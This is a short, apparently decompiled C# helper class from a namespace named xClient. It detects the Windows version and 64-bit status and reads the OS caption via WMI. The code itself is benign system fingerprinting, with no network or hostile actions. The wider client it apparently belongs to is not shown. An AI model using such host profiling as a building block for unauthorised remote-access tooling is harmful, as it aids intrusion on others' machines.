using System;
using System.Management;
using System.Text.RegularExpressions;

namespace xClient.Core.Helper;

public static class PlatformHelper
{
	public static string FullName { get; private set; }

	public static string Name { get; private set; }

	public static bool Is64Bit { get; private set; }

	public static bool RunningOnMono { get; private set; }

	public static bool Win32NT { get; private set; }

	public static bool XpOrHigher { get; private set; }

	public static bool VistaOrHigher { get; private set; }

	public static bool SevenOrHigher { get; private set; }

	public static bool EightOrHigher { get; private set; }

	public static bool EightPointOneOrHigher { get; private set; }

	public static bool TenOrHigher { get; private set; }

	static PlatformHelper()
	{
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
		XpOrHigher = Win32NT && Environment.OSVersion.Version.Major >= 5;
		VistaOrHigher = Win32NT && Environment.OSVersion.Version.Major >= 6;
		SevenOrHigher = Win32NT && Environment.OSVersion.Version >= new Version(6, 1);
		EightOrHigher = Win32NT && Environment.OSVersion.Version >= new Version(6, 2, 9200);
		EightPointOneOrHigher = Win32NT && Environment.OSVersion.Version >= new Version(6, 3);
		TenOrHigher = Win32NT && Environment.OSVersion.Version >= new Version(10, 0);
		RunningOnMono = Type.GetType("Mono.Runtime") != null;
		Name = "Unknown OS";
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
		try
		{
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					Name = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Caption").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		Name = Regex.Replace(Name, "^.*(?=Windows)", "").TrimEnd(new char[0]).TrimStart(new char[0]);
		Is64Bit = Environment.Is64BitOperatingSystem;
		FullName = $"{Name} {(Is64Bit ? 64 : 32)} Bit";
	}
}
